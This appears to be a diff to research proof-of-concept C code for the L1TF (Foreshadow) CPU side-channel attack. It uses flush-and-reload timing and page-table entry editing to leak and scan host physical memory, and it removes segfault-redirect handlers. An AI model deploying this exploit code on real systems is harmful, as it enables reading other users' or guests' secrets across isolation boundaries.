@@ -4,7 +4,6 @@
 #include "flush_and_reload.h"
 #include "statistics.h"
 #include <bits/types/siginfo_t.h>
-#include <signal.h>
 #include <stdbool.h>
 #include <stdint.h>
 #include <stdlib.h>
@@ -21,21 +20,6 @@
 #include <assert.h>
 
 #define THRESHOLD 150
-
-#pragma GCC diagnostic push
-#pragma GCC diagnostic ignored "-Wunused-parameter"
-static void segfault_handler_nibbles(int sig, siginfo_t *info, void *ucontext) {
-  ucontext_t *uc = (ucontext_t *)ucontext;
-  greg_t *rip = &uc->uc_mcontext.gregs[REG_RIP];
-  *rip = (uint64_t)&reload_label_nibbles;
-}
-//
-// static void segfault_handler_full(int sig, siginfo_t *info, void *ucontext) {
-//   ucontext_t *uc = (ucontext_t *)ucontext;
-//   greg_t *rip = &uc->uc_mcontext.gregs[REG_RIP];
-//   *rip = (uint64_t)&reload_label_full;
-// }
-#pragma GCC diagnostic pop
 
 uint8_t reconstruct_nibbles(size_t raw_results[AMOUNT_OF_RELOAD_PAGES]) {
   uint8_t result = 0;
@@ -106,23 +90,17 @@ void *l1tf_scan_physical_memory(size_t length, char needle[length],
 
   leak_addr_t leak = l1tf_leak_buffer_create();
 
-  struct sigaction sa = {0};
-  // sa.sa_handler = (void *)segfault_handler_full;
-  // sigaction(SIGSEGV, &sa, NULL);
-
   // First, scan quickly
   full_reload_buffer_t reload_buffer;
   for (uintptr_t ptr = 0; ptr < HOST_MEMORY_SIZE; ptr += stride) {
-    printf("%ld\r", ptr / stride);
+    if (ptr % 0x100000 == 0) {
+      fprintf(stderr, "%ld MB\r", ptr / stride);
+    }
     l1tf_leak_buffer_modify(&leak, (void *)ptr);
     if (l1tf_check(leak.leak, reload_buffer, needle[0])) {
       printf("%lx\n", ptr);
     }
   }
-
-  // Restore the segfault handler back to normal
-  sa.sa_handler = SIG_DFL;
-  sigaction(SIGSEGV, &sa, NULL);
 
   l1tf_leak_buffer_free(&leak);
   return 0;
@@ -163,7 +141,8 @@ void l1tf_leak_buffer_free(leak_addr_t *leak) {
 
 int main(int argc, char *argv[argc]) {
   assert(!ptedit_init());
-  // l1tf_scan_physical_memory(1, "\xde", PAGE_SIZE);
+  l1tf_scan_physical_memory(1, "\xde", PAGE_SIZE);
+  exit(0);
 
   // Step 1: Create a variable
   // Step 2: modify PTE to change make page containing that variable non-present
@@ -201,10 +180,6 @@ int main(int argc, char *argv[argc]) {
   leak_addr_t leak = l1tf_leak_buffer_create();
   l1tf_leak_buffer_modify(&leak, (void *)phys_addr);
 
-  struct sigaction sa = {0};
-  sa.sa_handler = (void *)segfault_handler_nibbles;
-  sigaction(SIGSEGV, &sa, NULL);
-
   fprintf(stderr, "Clear the reload buffer at %p\n", reload_buffer);
   memset(reload_buffer, 0, sizeof(reload_buffer_t));
 
@@ -231,10 +206,6 @@ int main(int argc, char *argv[argc]) {
     }
     printf("\r");
   }
-
-  // Restore the segfault handler back to normal
-  sa.sa_handler = SIG_DFL;
-  sigaction(SIGSEGV, &sa, NULL);
 
   free(results);
 
